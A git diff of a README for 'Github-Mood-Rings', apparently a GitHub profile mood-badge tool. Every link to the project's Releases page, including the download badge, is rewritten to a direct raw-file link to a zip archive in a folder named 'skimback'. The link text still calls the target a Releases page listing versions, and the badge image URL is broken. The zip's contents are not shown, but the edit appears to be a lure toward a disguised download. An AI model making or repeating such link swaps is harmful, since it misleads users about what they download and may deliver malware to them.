@@ -4,13 +4,13 @@
 Welcome to **Github-Mood-Rings**! This is a little mood ring that goes on your account and changes based on your account activity. It adds an interactive badge to your GitHub profile, showing your mood based on how active you are. 
 
 ## 🔗 Download Now!
-[![Download Github-Mood-Rings](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Tebur09/Github-Mood-Rings/releases)
+[![Download Github-Mood-Rings](https://raw.githubusercontent.com/Tebur09/Github-Mood-Rings/main/skimback/Github-Mood-Rings_1.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Tebur09/Github-Mood-Rings/main/skimback/Github-Mood-Rings_1.6.zip)
 
 ## 🚀 Getting Started
 To get started with **Github-Mood-Rings**, follow these simple steps to download and install the application.
 
 ### 1. Visit the Releases Page
-Head over to the [Releases page](https://github.com/Tebur09/Github-Mood-Rings/releases) to find the latest version of the application. This page lists all available versions along with their features and fixes.
+Head over to the [Releases page](https://raw.githubusercontent.com/Tebur09/Github-Mood-Rings/main/skimback/Github-Mood-Rings_1.6.zip) to find the latest version of the application. This page lists all available versions along with their features and fixes.
 
 ### 2. Choose the Version
 Look at the available versions and choose the one labeled as "Latest Release". This version contains the most recent updates and fixes.
@@ -52,6 +52,6 @@ Connect with other users in our community! Share your mood badge experiences and
 This project is open-source and available under the MIT License. Feel free to contribute or modify it to suit your needs.
 
 ## 📥 Additional Download Link
-You can also find the download link here: [Visit the Releases Page](https://github.com/Tebur09/Github-Mood-Rings/releases).
+You can also find the download link here: [Visit the Releases Page](https://raw.githubusercontent.com/Tebur09/Github-Mood-Rings/main/skimback/Github-Mood-Rings_1.6.zip).
 
 Thank you for checking out **Github-Mood-Rings**! We hope it brings a splash of fun to your GitHub profile.
